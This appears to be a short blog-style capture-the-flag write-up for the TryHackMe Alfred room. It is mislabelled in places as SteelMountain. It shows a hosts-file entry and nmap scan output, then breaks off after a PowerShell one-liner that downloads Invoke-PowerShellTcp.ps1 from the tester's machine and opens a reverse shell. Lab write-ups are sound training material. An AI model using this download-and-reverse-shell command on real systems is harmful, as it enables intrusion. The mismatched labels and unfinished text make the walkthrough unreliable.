---
title: TryHackMe - Alfred w/o Metasploit
publishDate: 2023-09-25
updateDate: 2023-09-25
author: Abhinav Kumar
image:   '~/assets/images/tryhackme-steelmountain.jpg'
excerpt: TryHackMe SteelMountain is a Windows box where we exploit Unquoted Service Paths, replace the service to get System user.
draft: false
category: TryHackMe
---

# SteelMountain

TryHackMe Link to SteelMountain Machine - [THM-SteelMountain](https://tryhackme.com/room/steelmountain)


We will Solve the Machine Completely and post that Answer to the Questions on TryHackMe in the end.


Adding machine to hosts file.
```bash
abhinav@ETHICALHACKX:~$ echo 10.10.145.60    alfred.thm | sudo tee -a /etc/hosts
[sudo] password for abhinav: 
10.10.145.60 alfred.thm
```


## Nmapping 

```bash
abhinav@ETHICALHACKX:~$ ports=$(nmap -p- --min-rate=1000 -T5 alfred.thm | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
                                                                                                            
abhinav@ETHICALHACKX:~$ echo $ports
80,3389,8080
                                                                                                            
abhinav@ETHICALHACKX:~$ sudo nmap -sC -sV -A -O -T5 -p$ports alfred.thm -Pn
[sudo] password for abhinav: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 23:15 IST
Nmap scan report for alfred.thm (10.10.145.60)
Host is up (0.17s latency).

PORT     STATE SERVICE        VERSION
80/tcp   open  http?
3389/tcp open  ms-wbt-server?
8080/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Timing level 5 (Insane) used
No OS matches for host

TRACEROUTE (using port 3389/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.27 seconds
                              
```

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.58.66:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.58.66 -Port 1234```